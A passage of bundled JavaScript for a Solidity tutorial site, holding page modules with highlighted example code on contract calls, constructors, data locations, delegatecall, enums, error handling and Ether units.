<span class=\"hljs-title\">Caller</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Response</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span> success, <span class=\"hljs-keyword\">bytes</span> data</span>)</span>;\n\n    <span class=\"hljs-comment\">// Let&#x27;s imagine that contract B does not have the source code for</span>\n    <span class=\"hljs-comment\">// contract A, but we do know the address of A and the function to call.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testCallFoo</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">payable</span> _addr</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-comment\">// You can send ether and specify a custom gas amount</span>\n        (<span class=\"hljs-keyword\">bool</span> success, <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> data) = _addr.<span class=\"hljs-built_in\">call</span>{<span class=\"hljs-built_in\">value:</span> <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>, <span class=\"hljs-built_in\">gas:</span> <span class=\"hljs-number\">5000</span>}(\n            <span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodeWithSignature</span>(<span class=\"hljs-string\">\"foo(string,uint256)\"</span>, <span class=\"hljs-string\">\"call foo\"</span>, <span class=\"hljs-number\">123</span>)\n        );\n\n        <span class=\"hljs-keyword\">emit</span> Response(success, data);\n    }\n\n    <span class=\"hljs-comment\">// Calling a function that does not exist triggers the fallback function.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testCallDoesNotExist</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _addr</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        (<span class=\"hljs-keyword\">bool</span> success, <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> data) = _addr.<span class=\"hljs-built_in\">call</span>(\n            <span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodeWithSignature</span>(<span class=\"hljs-string\">\"doesNotExist()\"</span>)\n        );\n\n        <span class=\"hljs-keyword\">emit</span> Response(success, data);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Calling Other Contract\"\nexport const description = \"In Solidity, contract can call other contracts in several ways\"\n\nconst html = `<p>Contract can call other contracts in 2 ways.</p>\n<p>The easiest way to is to just call it, like <code>A.foo(x, y, z)</code>.</p>\n<p>Another way to call other contracts is to use the low-level <code>call</code>.</p>\n<p>This method is not recommended.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Callee</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> x;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> value;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">setX</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _x</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        x = _x;\n        <span class=\"hljs-keyword\">return</span> x;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">setXandSendEther</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _x</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>, <span class=\"hljs-keyword\">uint</span></span>) </span>{\n        x = _x;\n        value = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>;\n\n        <span class=\"hljs-keyword\">return</span> (x, value);\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Caller</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">setX</span>(<span class=\"hljs-params\">Callee _callee, <span class=\"hljs-keyword\">uint</span> _x</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">uint</span> x = _callee.setX(_x);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">setXFromAddress</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _addr, <span class=\"hljs-keyword\">uint</span> _x</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        Callee callee = Callee(_addr);\n        callee.setX(_x);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">setXandSendEther</span>(<span class=\"hljs-params\">Callee _callee, <span class=\"hljs-keyword\">uint</span> _x</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        (<span class=\"hljs-keyword\">uint</span> x, <span class=\"hljs-keyword\">uint</span> value) = _callee.setXandSendEther{<span class=\"hljs-built_in\">value:</span> <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>}(_x);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Constructor\"\nexport const description = \"Learn how to initialize smart contracts in Solidity using a constructor\"\n\nconst html = `<p>A <code>constructor</code> is an optional function that is executed upon contract creation.</p>\n<p>Here are examples of how to pass arguments to <code>constructors</code>.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">// Base contract X</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">X</span> </span>{\n    <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">public</span> name;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _name</span>) </span>{\n        name = _name;\n    }\n}\n\n<span class=\"hljs-comment\">// Base contract Y</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Y</span> </span>{\n    <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">public</span> text;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _text</span>) </span>{\n        text = _text;\n    }\n}\n\n<span class=\"hljs-comment\">// There are 2 ways to initialize parent contract with parameters.</span>\n\n<span class=\"hljs-comment\">// Pass the parameters here in the inheritance list.</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">B</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">X</span>(<span class=\"hljs-params\"><span class=\"hljs-string\">\"Input to X\"</span></span>), <span class=\"hljs-title\">Y</span>(<span class=\"hljs-params\"><span class=\"hljs-string\">\"Input to Y\"</span></span>) </span>{\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">C</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">X</span>, <span class=\"hljs-title\">Y</span> </span>{\n    <span class=\"hljs-comment\">// Pass the parameters here in the constructor,</span>\n    <span class=\"hljs-comment\">// similar to function modifiers.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _name, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _text</span>) <span class=\"hljs-title\">X</span>(<span class=\"hljs-params\">_name</span>) <span class=\"hljs-title\">Y</span>(<span class=\"hljs-params\">_text</span>) </span>{\n    }\n}\n\n<span class=\"hljs-comment\">// Parent constructors are always called in the order of inheritance</span>\n<span class=\"hljs-comment\">// regardless of the order of parent contracts listed in the</span>\n<span class=\"hljs-comment\">// constructor of the child contract.</span>\n\n<span class=\"hljs-comment\">// Order of constructors called:</span>\n<span class=\"hljs-comment\">// 1. Y</span>\n<span class=\"hljs-comment\">// 2. X</span>\n<span class=\"hljs-comment\">// 3. E</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">E</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">X</span>, <span class=\"hljs-title\">Y</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\">X</span>(<span class=\"hljs-params\"><span class=\"hljs-string\">\"X was called\"</span></span>) <span class=\"hljs-title\">Y</span>(<span class=\"hljs-params\"><span class=\"hljs-string\">\"Y was called\"</span></span>) </span>{\n    }\n}\n\n<span class=\"hljs-comment\">// Order of constructors called:</span>\n<span class=\"hljs-comment\">// 1. Y</span>\n<span class=\"hljs-comment\">// 2. X</span>\n<span class=\"hljs-comment\">// 3. E</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">E</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">X</span>, <span class=\"hljs-title\">Y</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\">Y</span>(<span class=\"hljs-params\"><span class=\"hljs-string\">\"Y was called\"</span></span>) <span class=\"hljs-title\">X</span>(<span class=\"hljs-params\"><span class=\"hljs-string\">\"X was called\"</span></span>) </span>{\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Data Locations - Storage, Memory and Calldata\"\nexport const description = \"Data locations - storage, memory and calldata\"\n\nconst html = `<p>Variables are declared as either <code>storage</code>, <code>memory</code> or <code>calldata</code> to explicitly\nspecify the location of the data.</p>\n<ul>\n<li><code>storage</code> - variable is a state variable (store on blockchain)</li>\n<li><code>memory</code> - variable is in memory and it exists while a function is being called</li>\n<li><code>calldata</code> - special data location that contains function arguments, only available for <code>external</code> functions</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">DataLocations</span> </span>{\n    <span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">public</span> arr;\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">uint</span> =&gt; <span class=\"hljs-keyword\">address</span>) map;\n    <span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">MyStruct</span> {\n        <span class=\"hljs-keyword\">uint</span> foo;\n    }\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">uint</span> =&gt; MyStruct) myStructs;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">f</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// call _f with state variables</span>\n        _f(arr, map, myStructs[<span class=\"hljs-number\">1</span>]);\n\n        <span class=\"hljs-comment\">// get a struct from a mapping</span>\n        MyStruct <span class=\"hljs-keyword\">storage</span> myStruct = myStructs[<span class=\"hljs-number\">1</span>];\n        <span class=\"hljs-comment\">// create a struct in memory</span>\n        MyStruct <span class=\"hljs-keyword\">memory</span> myMemStruct = MyStruct(<span class=\"hljs-number\">0</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_f</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">storage</span> _arr,\n        <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> =&gt; <span class=\"hljs-keyword\">address</span></span>) <span class=\"hljs-keyword\">storage</span> _map,\n        MyStruct <span class=\"hljs-keyword\">storage</span> _myStruct\n    </span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">internal</span></span> </span>{\n        <span class=\"hljs-comment\">// do something with storage variables</span>\n    }\n\n    <span class=\"hljs-comment\">// You can return memory variables</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">g</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">memory</span> _arr</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-comment\">// do something with memory array</span>\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">h</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">calldata</span> _arr</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> </span>{\n        <span class=\"hljs-comment\">// do something with calldata array</span>\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Delegatecall\"\nexport const description = \"Example of how to use deletegatecall in Solidity\"\n\nconst html = `<p><code>delegatecall</code> is a low level function similar to <code>call</code>.</p>\n<p>When contract <code>A</code> executes <code>delegatecall</code> to contract <code>B</code>, <code>B</code>&#39;s code is excuted</p>\n<p>with contract <code>A</code>&#39;s storage, <code>msg.sender</code> and <code>msg.value</code>.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">// <span class=\"hljs-doctag\">NOTE:</span> Deploy this contract first</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">B</span> </span>{\n    <span class=\"hljs-comment\">// <span class=\"hljs-doctag\">NOTE:</span> storage layout must be the same as contract A</span>\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> num;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> sender;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> value;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">setVars</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _num</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        num = _num;\n        sender = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>;\n        value = <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">A</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> num;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> sender;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> value;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">setVars</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _contract, <span class=\"hljs-keyword\">uint</span> _num</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        <span class=\"hljs-comment\">// A&#x27;s storage is set, B is not modified.</span>\n        (<span class=\"hljs-keyword\">bool</span> success, <span class=\"hljs-keyword\">bytes</span> <span class=\"hljs-keyword\">memory</span> data) = _contract.<span class=\"hljs-built_in\">delegatecall</span>(\n            <span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodeWithSignature</span>(<span class=\"hljs-string\">\"setVars(uint256)\"</span>, _num)\n        );\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Enum\"\nexport const description = \"Example of enums in Solidity\"\n\nconst html = `<p>Solidity support enumerables and they are useful to model choice and keep track of state.</p>\n<p>Enums can be declared ouside of a contract.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Enum</span> </span>{\n    <span class=\"hljs-comment\">// Enum representing shipping status</span>\n    <span class=\"hljs-keyword\">enum</span> <span class=\"hljs-title\">Status</span> {\n        Pending,\n        Shipped,\n        Accepted,\n        Rejected,\n        Canceled\n    }\n\n    <span class=\"hljs-comment\">// Default value is the first element listed in</span>\n    <span class=\"hljs-comment\">// definition of the type, in this case \"Pending\"</span>\n    Status <span class=\"hljs-keyword\">public</span> status;\n\n    <span class=\"hljs-comment\">// Returns uint</span>\n    <span class=\"hljs-comment\">// Pending  - 0</span>\n    <span class=\"hljs-comment\">// Shipped  - 1</span>\n    <span class=\"hljs-comment\">// Accepted - 2</span>\n    <span class=\"hljs-comment\">// Rejected - 3</span>\n    <span class=\"hljs-comment\">// Canceled - 4</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\">Status</span>) </span>{\n        <span class=\"hljs-keyword\">return</span> status;\n    }\n\n    <span class=\"hljs-comment\">// Update status by passing uint into input</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">set</span>(<span class=\"hljs-params\">Status _status</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        status = _status;\n    }\n\n    <span class=\"hljs-comment\">// You can update to a specific enum like this</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">cancel</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        status = Status.Canceled;\n    }\n\n    <span class=\"hljs-comment\">// delete resets the enum to it&#x27;s first value, 0</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">reset</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">delete</span> status;\n    }\n}\n</code></pre>\n<h3 id=\"declaring-and-importing-enum\">Declaring and importing Enum</h3>\n<p>File that the enum is declared in</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-keyword\">enum</span> <span class=\"hljs-title\">Status</span> {\n    Pending,\n    Shipped,\n    Accepted,\n    Rejected,\n    Canceled\n}</code></pre>\n<p>File that imports the enum above</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"./EnumDeclaration.sol\"</span>;\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Enum</span> </span>{\n    Status <span class=\"hljs-keyword\">public</span> status;\n}</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Error\"\nexport const description = \"Example of how to throw errors in Solidity\"\n\nconst html = `<p>An error will undo all changes made to the state during a transaction.</p>\n<p>You can throw an error by calling <code>require</code>, <code>revert</code> or <code>assert</code>.</p>\n<ul>\n<li><code>require</code> is used to validate inputs and conditions before execution.</li>\n<li><code>revert</code> is similar to <code>require</code>. See the code below for details.</li>\n<li><code>assert</code> is used to check for code that should never be false. Failing\nassertion probably means that there is a bug.</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\"><span class=\"hljs-built_in\">Error</span></span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testRequire</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _i</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Require should be used to validate conditions such as:</span>\n        <span class=\"hljs-comment\">// - inputs</span>\n        <span class=\"hljs-comment\">// - conditions before execution</span>\n        <span class=\"hljs-comment\">// - return values from calls to other functions</span>\n        <span class=\"hljs-built_in\">require</span>(_i &gt; <span class=\"hljs-number\">10</span>, <span class=\"hljs-string\">\"Input must be greater than 10\"</span>);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testRevert</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _i</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Revert is useful when the condition to check is complex.</span>\n        <span class=\"hljs-comment\">// This code does the exact same thing as the example above</span>\n        <span class=\"hljs-keyword\">if</span> (_i &lt;= <span class=\"hljs-number\">10</span>) {\n            <span class=\"hljs-built_in\">revert</span>(<span class=\"hljs-string\">\"Input must be greater than 10\"</span>);\n        }\n    }\n\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> num;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testAssert</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Assert should only be used to test for internal errors,</span>\n        <span class=\"hljs-comment\">// and to check invariants.</span>\n\n        <span class=\"hljs-comment\">// Here we assert that num is always equal to 0</span>\n        <span class=\"hljs-comment\">// since it is impossible to update the value of num</span>\n        <span class=\"hljs-built_in\">assert</span>(num == <span class=\"hljs-number\">0</span>);\n    }\n}\n</code></pre>\n<p>Here is another example</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Account</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> balance;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">constant</span> MAX_UINT = <span class=\"hljs-number\">2</span> ** <span class=\"hljs-number\">256</span> - <span class=\"hljs-number\">1</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deposit</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">uint</span> oldBalance = balance;\n        <span class=\"hljs-keyword\">uint</span> newBalance = balance + _amount;\n\n        <span class=\"hljs-comment\">// balance + _amount does not overflow if balance + _amount &gt;= balance</span>\n        <span class=\"hljs-built_in\">require</span>(newBalance &gt;= oldBalance, <span class=\"hljs-string\">\"Overflow\"</span>);\n\n        balance = newBalance;\n\n        <span class=\"hljs-built_in\">assert</span>(balance &gt;= oldBalance);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">withdraw</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> _amount</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">uint</span> oldBalance = balance;\n\n        <span class=\"hljs-comment\">// balance - _amount does not underflow if balance &gt;= _amount</span>\n        <span class=\"hljs-built_in\">require</span>(balance &gt;= _amount, <span class=\"hljs-string\">\"Underflow\"</span>);\n\n        <span class=\"hljs-keyword\">if</span> (balance &lt; _amount) {\n            <span class=\"hljs-built_in\">revert</span>(<span class=\"hljs-string\">\"Underflow\"</span>);\n        }\n\n        balance -= _amount;\n\n        <span class=\"hljs-built_in\">assert</span>(balance &lt;= oldBalance);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Ether and Wei\"\nexport const description = \"An example of Ether and Wei in Solidity\"\n\nconst html = `<p>Transactions are paid with <code>ether</code>.</p>\n<p>Similar to how one dollar is equal to 100 cent, one <code>ether</code> is equal to 10<sup>18</sup> <code>wei</code>.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">EtherUnits</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> oneWei = <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">wei</span>;\n    <span class=\"hljs-comment\">// 1 wei is equal to 1</span>\n    <span class=\"hljs-keyword\">bool</span> <span class=\"hljs-keyword\">public</span> isOneWei = <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">wei</span> == <span class=\"hljs-number\">1</span>;\n\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> oneEther = <span class=\"hljs-number\">1</span> <span class=\"hljs-literal\">ether</span>;\n    <span 